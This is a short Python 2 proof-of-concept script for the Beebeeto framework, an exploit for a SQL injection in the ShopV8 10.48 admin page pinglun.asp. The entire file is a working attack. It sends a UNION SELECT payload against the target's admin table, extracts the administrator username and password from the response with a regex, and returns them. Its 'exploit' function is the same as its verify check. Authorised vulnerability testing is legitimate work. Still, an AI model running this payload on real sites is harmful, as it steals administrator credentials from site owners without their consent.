#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0045',
            'name': 'ShopV8 10.48 /admin/pinglun.asp SQL注入漏洞 EXP',
            'author': 'Bug',
            'create_date': '2014-10-02',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'shopv8',  # 漏洞所涉及的应用名称
            'vul_version': ['10.48'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['SQL Injection', 'shopv8', '信息泄露'],  # 漏洞相关tag
            'desc': '漏洞出现在pinglun.asp文件',  # 漏洞描述
            'references': ['http://www.shellsec.com/tech/2143.html'],  # 参考链接
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ("/admin/pinglun.asp?id=1%20and%201=2%20union%20select%201,2,3,4,"
                   "username,password,7,8,9,10,11%20from%20admin")
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(urllib2.Request(verify_url)).read()
        pattern = re.compile(r'.*?id=[\'"]?pingluntitle[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'#匹配用户名
                             r'.*?id=[\'"]?pingluncontent[\'"]?.*?>(?P<password>\w+)</textarea>',#匹配密码
                             re.I|re.S)#忽略大小写、单行模式
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        username = match.group("username")
        password = match.group("password")
        args['success'] = True
        args['poc_ret']['vul_url'] = verify_url
        args['poc_ret']['Username'] = username
        args['poc_ret']['Password'] = password
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
